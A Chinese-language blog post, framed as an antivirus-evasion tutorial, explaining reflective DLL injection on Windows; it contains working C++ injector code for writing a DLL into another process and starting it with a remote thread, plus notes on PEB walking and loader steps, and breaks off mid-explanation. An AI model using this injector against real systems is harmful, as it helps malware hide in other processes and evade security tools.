<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【免杀】反射式DLL注入详解</title><meta name="description" content="&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A&quot;&gt;https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A&lt;/a&gt;&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【免杀】反射式DLL注入详解</h3><div class="article__date metadata"><div class="post-info">2024/10/01</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/bypass/">bypass</a></div><div class="article__body"><p>公众号：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A">https://mp.weixin.qq.com/s/M92n3e-yCG64ry9GLt5A3A</a></p>
<span id="more"></span>
<p>或许我们的公众号会有更多你感兴趣的内容</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p>
<h1 id="免杀反射式dll注入详解"><a class="markdownIt-Anchor" href="#免杀反射式dll注入详解"></a> 【免杀】反射式DLL注入详解</h1>
<p>在前文：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ">PE文件格式解析</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ">常见的DLL和Shellcode注入方式</a>中已经讲解了基本的注入方式和PE文件结构。那么我们可以提出这样指一种注入方式：将dll的内容放到目标进程中，然后找到这个dll完成PE映射到内存的函数（假设为<code>void loader()</code>），这也要求<code>loader</code>函数一定要在导出表上。</p>
<ol>
<li>获得dll<code>loader</code>函数在内存中的虚拟地址</li>
<li>注入器将dll写入目标进程然后调用<code>loader</code></li>
<li>loader运行</li>
</ol>
<h2 id="注入器编写"><a class="markdownIt-Anchor" href="#注入器编写"></a> 注入器编写</h2>
<ol>
<li>
<p>打开dll文件</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   std::string path;</span><br><span class="line">   DWORD pid;</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;[+] pid: &quot;</span>;</span><br><span class="line">   <span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;pid);</span><br><span class="line">std::cin.<span class="built_in">ignore</span>();</span><br><span class="line">   std::cout &lt;&lt; <span class="string">&quot;[+] DLL Path: &quot;</span>;</span><br><span class="line">   std::<span class="built_in">getline</span>(std::cin, path);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//1.打开dll文件</span></span><br><span class="line">   HANDLE hFile = <span class="built_in">CreateFileA</span>(path.<span class="built_in">c_str</span>(), GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;Create File Failed\n&quot;</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span> (dwFileSize == <span class="number">0</span>) &#123;</span><br><span class="line">       std::cout &lt;&lt; <span class="string">&quot;File Size is Zero!\n&quot;</span>;</span><br><span class="line">       <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>将dll写入到目标进程</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Allocate Address or Open Process Failed\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">LPVOID pBase = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBase == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Allocate Memory Failed\n&quot;</span>;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>* buffer = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize];</span><br><span class="line">DWORD dwReadSize;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ReadFile</span>(hFile, buffer, dwFileSize, &amp;dwReadSize, <span class="literal">NULL</span>) == FALSE) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read the file.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, pBase, buffer, dwFileSize, &amp;dwWriteSize);</span><br><span class="line"><span class="keyword">if</span> (dwWriteSize != dwFileSize) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;File Load partitially\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>获得<code>loader</code>函数地址</p>
<p>按照之前提到的pe格式，就是从<code>IMAGE_DATA_DIRECTORY</code>的导出表中，利用<code>FirstThunk</code>进行遍历，如果字符串匹配，就根据结构体的相关变量找到函数地址</p>
<p>首先是得到RVA转换的函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">VA2RVA</span><span class="params">(DWORD64 dwRva, DWORD64 BaseAddress)</span> </span>&#123;</span><br><span class="line">    DWORD64 VA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 RVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionHeader;</span><br><span class="line"></span><br><span class="line">    DWORD64 ntheader = BaseAddress + ((PIMAGE_DOS_HEADER)BaseAddress)-&gt;e_lfanew;</span><br><span class="line">    WORD sectionNum = ((PIMAGE_NT_HEADERS64)ntheader)-&gt;FileHeader.NumberOfSections;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionHeader = ntheader + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        <span class="keyword">if</span> (((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress &gt; dwRva)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        VA = ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress;</span><br><span class="line">        RVA = dwRva - VA + ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要说明下<code>IMAGE_EXPORT_DIRECTORY</code>导出表目录结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@[comment(&quot;MVI_tracked&quot;)]</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>AddressOfNames</code>：函数名称地址DWORD数组，需要RVA</li>
<li><code>AddressOfFunctions</code>：Export函数地址DWORD数组，需要RVA</li>
<li><code>AddressOfNameOrdinals</code>：这是WORD数组，举个例子：目前存在着两个数组，<code>AddressOfNames[i]</code>和<code>AddressOfFunctions[j]</code>，<code>AddressOfNameOrdinals</code>存在的意义就是可以通过下标<code>i</code>找到另一个<code>j</code>，类似数据库中的<strong>关系表</strong></li>
</ul>
<p>拿到<code>AddressOfNames</code>去比较得到<code>i</code>，然后使用<code>i</code>从<code>AddressOfNameOrdinals</code>得到<code>j</code>，最后使用<code>j</code>从<code>AddressOfFunctions</code>找到函数地址</p>
<p>注意得是<code>AddressOfNames</code>是一个DWORD数组，并且需要根据DWORD数据重定位才能得到函数名。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">getFunctionOffset</span><span class="params">(HANDLE peBuffer, <span class="type">const</span> <span class="type">char</span>* funcionName)</span> </span>&#123;</span><br><span class="line">    DWORD64 dosHeader = (DWORD64)peBuffer;</span><br><span class="line">    DWORD64 ntHeader = dosHeader + ((PIMAGE_DOS_HEADER)peBuffer)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//导入目录</span></span><br><span class="line">    DWORD64 eatDVA = ((PIMAGE_NT_HEADERS64)ntHeader)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">    DWORD64 exportDirRVA = <span class="built_in">VA2RVA</span>(eatDVA, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportNameAddr = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNames, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportFuncAddr = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfFunctions, dosHeader) + dosHeader;</span><br><span class="line">    DWORD64 exportOrdinals = <span class="built_in">VA2RVA</span>(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNameOrdinals, dosHeader) + dosHeader;</span><br><span class="line"></span><br><span class="line">    DWORD sumNames = ((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.遍历找到i</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; sumNames; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span>* cpExportedFunctionName = (<span class="type">char</span>*)(dosHeader + <span class="built_in">VA2RVA</span>((<span class="built_in">PDWORD</span>(exportNameAddr))[i], dosHeader));</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;func: &quot;</span> &lt;&lt; cpExportedFunctionName &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(cpExportedFunctionName, funcionName)) &#123;</span><br><span class="line">            exportFuncAddr += (<span class="built_in">PWORD</span>(exportOrdinals)[i]);</span><br><span class="line">            <span class="keyword">return</span>  <span class="built_in">VA2RVA</span>(<span class="built_in">PDWORD</span>(exportFuncAddr)[<span class="number">0</span>], dosHeader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在远程进程中加载</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 loaderFuncAddr = <span class="built_in">getFunctionOffset</span>(buffer, <span class="string">&quot;loader&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (loaderFuncAddr == <span class="number">0</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Get Export Function Error\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPTHREAD_START_ROUTINE lpReflectiveLoader = <span class="built_in">reinterpret_cast</span>&lt;LPTHREAD_START_ROUTINE&gt;(</span><br><span class="line">    <span class="built_in">reinterpret_cast</span>&lt;ULONG_PTR&gt;(pBase) + loaderFuncAddr</span><br><span class="line">    );</span><br><span class="line">   </span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">1024</span> * <span class="number">1024</span>, lpReflectiveLoader, pBase, (DWORD)<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == INVALID_HANDLE_VALUE || hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Create Thread Failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">500</span>);</span><br><span class="line">   </span><br><span class="line"><span class="keyword">delete</span>[] buffer;</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBase, (SIZE_T)dwFileSize + <span class="number">1</span>, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>这里我是用 <a target="_blank" rel="noopener" href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 的DLL进行测试，函数名为<code>ReflectiveLoader</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151719965.png" alt="image-20250103214642081" /></p>
<h2 id="关于peb"><a class="markdownIt-Anchor" href="#关于peb"></a> 关于PEB</h2>
<p>PEB：process environment block，处理环境块。可以参考：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  BYTE                          BeingDebugged;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>BeingDebugged</code>：当前是否被调试，反调试和反反调试常用</li>
<li><code>Ldr</code>：该结构包含有关进程已加载模块的信息</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span></span><br><span class="line">&#123;</span><br><span class="line">   DWORD dwLength;</span><br><span class="line">   DWORD dwInitialized;</span><br><span class="line">   LPVOID lpSsHandle;</span><br><span class="line">   LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">   LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">   LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">   LPVOID lpEntryInProgress;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure>
<p>当程序每加载一个dll的时候，就会添加到<code>InMemoryOrderModuleList</code>中（三个<code>LIST_ENTRY</code>都会添加），<code>LIST_ENTRY</code>可以被解析为<code>LDR_DATA_TABLE_ENTRY</code>，因为数据间隔对的上…所以很抽象</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line"><span class="comment">//...   </span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>
<p>通过<code>FullDllName</code>可以得到当前dll的完整名称（带有路径），同时<code>DllBase</code>指向该dll的基地址（即加入到内存中的其实地址）</p>
<h2 id="dll编写"><a class="markdownIt-Anchor" href="#dll编写"></a> DLL编写</h2>
<p>首先就是loader函数，由于我们是在PE文件没有完成映射到内存时进行调用的，那么这段函数本质上和shellcode一样是一段地址无关代码。我们应该明确这段函数能执行以下任务：</p>
<ul>
<li>获得当前内存地址，方便后续解析PE文件</li>
<li>从<code>peb-&gt;ldr</code>获得相关函数，如<code>GetProcAddress</code>、<code>VirtualAlloc</code>、<code>Loadlibrary</code>等</li>
<li>解析PE文件得到完成映射后的大小并<code>VirtualAlloc</code>分配内存</li>
<li>完成Section段的映射</li>
<li>遍历导入表，使用<code>Loadlibrary</code>加载本dll所需要的各种函数</li>
<li>处理重定位</li>
<li>获得PE文件中<code>AddressOfEntryPoint</code>完成映射后的地址，然后跳转执行</li>
</ul>
<p>整个过程也是非常枯燥的，以<a target="_blank" rel="noopener" href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 举例</p>
<ol>
<li>
<p>获得当前内存地址，方便后续解析PE文件。首先我们要得到当前PE文件的起始部分， 项目是通过<code>#pragma intrinsic</code>返回函数调用的返回地址，然后判断DOS头和NT头是否匹配来逐步调整，得到PE文件起始地址<code>fileBase</code>。</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151727369.png" alt="image-20250105153732219" /></p>
</li>
<li>
<p>从<code>peb-&gt;ldr</code>获得相关函数。项目为了做到良好的兼容性使用的是<code>__readgsqword</code>和<code>_MoveFromCoprocessor</code>（ARM），函数的作用是从相对于 GS 段开头的偏移量指定的位置读取内存，比如在GS偏移为0x60的位置就是<code>PEB</code>存放的位置，通过遍历PEB中的LDR可以找到所有被加载的dll的相关信息，甚至是在内存中未被映射的PE文件，例如：</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151733174.png" alt="image-20250105154150671" /></p>
<p>项目的这一步做的过程是差不多的，</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151737533.png" alt="image-20250105154538122" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151741450.png" alt="image-20250105154515644" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151745741.png" alt="image-20250105155234308" /></p>
<p>通过解析<code>kernel32.dll</code>，<code>ntdll.dll</code>的在内存中PE文件，计算出<code>LoadLibraryA</code>，<code>GetProAddress</code>，<code>VritualAlloc</code>，<code>NtFlushInstructionCache</code>三个函数在内存中的位置，便于后续调用。这里的<code>NtFlushInstructionCache</code>函数，用于刷新指定进程的指令缓存</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">NtFlushInstructionCache</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T RegionSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>如果是在用户层使用的话是封装在<code>kernel32.dll</code>的<code>FlushInstructionCache</code>中的，不过直接调用可以避免一些不必要的“检查”</p>
</li>
<li>
<p>完成映射。现在我们得到了当前dll的PE文件起始位置，可以通过NT头中<code>OptionalHeader</code>的<code>SizeOfImage</code>得到完成映射所需要的空间大小，然后用步骤2中找到的<code>VirtualAlloc</code>申请空间，得到内存映射的起始地址<code>memBase</code>。然后先把DOS头和NT头复制过去，当然头的大小也是由<code>OptionalHeader</code>的<code>SizeOfHeaders</code>可以得到的</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151750633.png" alt="image-20250105155757072" /></p>
</li>
<li>
<p>完成Section段的映射</p>
<p>这里就不得不复习Section头的结构体了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line"> &#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>
